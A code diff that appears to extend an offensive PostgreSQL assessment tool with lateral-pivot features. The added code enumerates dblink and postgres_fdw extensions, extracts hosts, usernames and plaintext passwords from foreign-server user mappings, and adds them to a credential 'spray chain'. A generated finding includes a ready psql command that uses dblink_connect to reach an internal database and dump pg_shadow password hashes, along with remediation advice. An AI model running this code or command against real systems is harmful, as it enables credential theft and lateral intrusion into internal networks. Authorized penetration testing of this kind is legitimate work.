@@ -286,6 +286,36 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
         out["extensions"] = [r[0] for r in _simple_query(
             sock, "SELECT extname FROM pg_extension WHERE extname IN "
             "('plpythonu','plpython3u','plperlu','pltclu','plsh') ORDER BY 1")]
+        # Lateral-pivot surface: dblink / postgres_fdw let a (super)user open outbound
+        # connections to OTHER database hosts the app can reach - pivot + SSRF.
+        out["pivot_ext"] = [r[0] for r in _simple_query(
+            sock, "SELECT name FROM pg_available_extensions "
+            "WHERE name IN ('dblink','postgres_fdw') ORDER BY 1")]
+        out["pivot_installed"] = [r[0] for r in _simple_query(
+            sock, "SELECT extname FROM pg_extension "
+            "WHERE extname IN ('dblink','postgres_fdw') ORDER BY 1")]
+        # Configured foreign servers = concrete internal DB hosts (lateral targets), and
+        # their user mappings may embed a password a superuser can read.
+        out["foreign_servers"] = []
+        for r in _simple_query(
+                sock, "SELECT s.srvname, "
+                "array_to_string(s.srvoptions,' '), "
+                "COALESCE(array_to_string(um.umoptions,' '),'') "
+                "FROM pg_foreign_server s "
+                "LEFT JOIN pg_user_mappings um ON um.srvid = s.oid ORDER BY 1"):
+            name, sopts, uopts = (r + ["", "", ""])[:3]
+            host = re.search(r"host[= ]([^\s]+)", sopts or "")
+            db = re.search(r"dbname[= ]([^\s]+)", sopts or "")
+            muser = re.search(r"user[= ]([^\s]+)", uopts or "")
+            mpass = re.search(r"password[= ]([^\s]+)", uopts or "")
+            out["foreign_servers"].append({
+                "name": name, "host": host.group(1) if host else "",
+                "dbname": db.group(1) if db else "",
+                "user": muser.group(1) if muser else "",
+                "password": mpass.group(1) if mpass else ""})
+        out["can_pivot"] = bool(
+            (out.get("pivot_installed") or (out.get("pivot_ext") and out.get("is_superuser")))
+            or out.get("foreign_servers"))
         try:
             sock.sendall(b"X" + struct.pack("!I", 4))   # Terminate, politely
         except OSError:
@@ -473,6 +503,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     ["CWE-306", "CWE-287"], kind="pg_trust_auth"))
                 _rce_finding(out, tgt, h.ip, p.portid, lt, proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
+                _pivot_finding(out, tgt, h.ip, p.portid, lt)
             elif pr.get("cred_access"):
                 lt = pr.get("loot") or {}
                 who = pr.get("cred_user", "?")
@@ -488,7 +519,45 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who,
                              proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
+                _pivot_finding(out, tgt, h.ip, p.portid, lt)
     return out
+
+
+def _pivot_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
+    """Emit the lateral-pivot finding when dblink / postgres_fdw is reachable, or a
+    foreign server is configured (a concrete internal DB target)."""
+    if not lt or not lt.get("can_pivot"):
+        return
+    installed = lt.get("pivot_installed") or []
+    avail = lt.get("pivot_ext") or []
+    servers = lt.get("foreign_servers") or []
+    bits = []
+    if installed:
+        bits.append(f"{', '.join(installed)} already installed")
+    elif avail:
+        bits.append(f"{', '.join(avail)} available (a superuser can CREATE EXTENSION)")
+    tgt_txt = ""
+    if servers:
+        named = [f"{s['name']}({s['host']}{':' + s['dbname'] if s['dbname'] else ''})"
+                 for s in servers if s.get("host")]
+        tgt_txt = (" Configured foreign server(s) point at internal DB hosts: "
+                   + ", ".join(named[:6]) + "." if named else
+                   f" {len(servers)} foreign server(s) configured.")
+    out.append(_finding(
+        "high", "PostgreSQL lateral pivot (dblink / postgres_fdw)", tgt,
+        "This instance can open OUTBOUND database connections from the DB host: "
+        + ("; ".join(bits) if bits else "foreign servers configured") + "."
+        + tgt_txt
+        + " Use it to reach internal databases the app can talk to but you can't "
+        "directly (pivot), to SSRF arbitrary host:port (dblink_connect), and to relay "
+        "credentials.",
+        f"psql 'host={ip} port={port} user=<u>' -c \"SELECT dblink_connect('h', "
+        "'host=<internal-db> user=postgres dbname=postgres'); "
+        "SELECT * FROM dblink('h','SELECT usename,passwd FROM pg_shadow') "
+        "AS t(u text,p text);\"",
+        "Remove dblink/postgres_fdw if unused; restrict outbound network from the DB "
+        "host; least-privilege the role; rotate any foreign-server credentials.",
+        ["CWE-441", "CWE-284"], kind="pg_pivot"))
 
 
 def _datamine_finding(out: list, tgt: str, ip: str, port: int, dm: dict | None) -> None:
@@ -643,6 +712,17 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                                 username="(embedded)", secret=cs, kind="password",
                                 source="postgres-datamine", origin_ip=t["ip"],
                                 notes=f"connection string mined from PostgreSQL :{t['port']}"))
+                    # Lateral: foreign-server user mappings embed creds for internal
+                    # DB hosts (pivot targets) - harvest them for the spray chain.
+                    for fs_ in lt.get("foreign_servers", []):
+                        if fs_.get("user") and fs_.get("password"):
+                            looted.append(Credential(
+                                username=fs_["user"], secret=fs_["password"],
+                                kind="password", source="postgres-fdw-loot",
+                                origin_ip=fs_.get("host") or t["ip"],
+                                notes=f"postgres_fdw user mapping for foreign server "
+                                      f"'{fs_['name']}' ({fs_.get('host', '?')}) "
+                                      f"via {t['ip']}:{t['port']} (sprayable)"))
                     # Foothold: opt-in benign RCE proof on a superuser/COPY-capable role.
                     if prove and lt.get("can_rce"):
                         pr["rce_proof"] = prove_rce(t["ip"], t["port"],
